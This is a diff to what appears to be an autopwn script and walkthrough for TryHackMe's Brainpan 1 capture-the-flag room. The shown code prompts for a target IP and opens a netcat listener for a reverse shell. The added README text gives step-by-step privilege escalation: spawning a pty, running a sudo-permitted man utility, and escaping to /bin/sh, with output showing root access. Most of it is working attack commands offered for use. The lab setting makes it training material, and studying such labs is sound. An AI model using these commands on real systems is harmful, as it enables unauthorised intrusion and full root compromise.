@@ -12,7 +12,7 @@ import time
 
 
 print ("Autopwnd TryHackMe's Brainpan 1 room (https://tryhackme.com/room/brainpan).")
-print ("Please first of all read README.md")
+print ("Please first of all read README.md(https://github.com/Kalugh/Autopwn-Brainpan-1/blob/main/README.md)")
 victim = input("Enter your ip you want to attack:")
 
 ip = victim
@@ -47,4 +47,39 @@ except:
 
 command = "nc -nvlp 4444" # Chage this if you change the port doing your shellcode introduced on payload
 subprocess.call(command, shell=True)
+```
+# Privilege Escalation
+Now you are in the linux machine called "puck(puck@brainpan:/home/puck$)"
+
+You need to run just 3 commands in this order:
+
+1st. python3 -c "import pty; pty.spawn('/bin/bash');"
+
+2nd. sudo /home/anansi/bin/anansi_util manual ls
+```
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls
+sudo /home/anansi/bin/anansi_util manual ls
+No manual entry for manual
+WARNING: terminal is not fully functional
+-  (press RETURN)  
+```
+3rd. Don't press RETURN just execute: !/bin/sh
+
+Just like this:
+```
+sudo /home/anansi/bin/anansi_util manual ls
+No manual entry for manual
+WARNING: terminal is not fully functional
+-  (press RETURN)!bin/sh
+```
+After that you should see something like this:
+```
+sudo /home/anansi/bin/anansi_util manual ls
+No manual entry for manual
+WARNING: terminal is not fully functional
+-  (press RETURN)!/bin/sh
+!/bin/sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
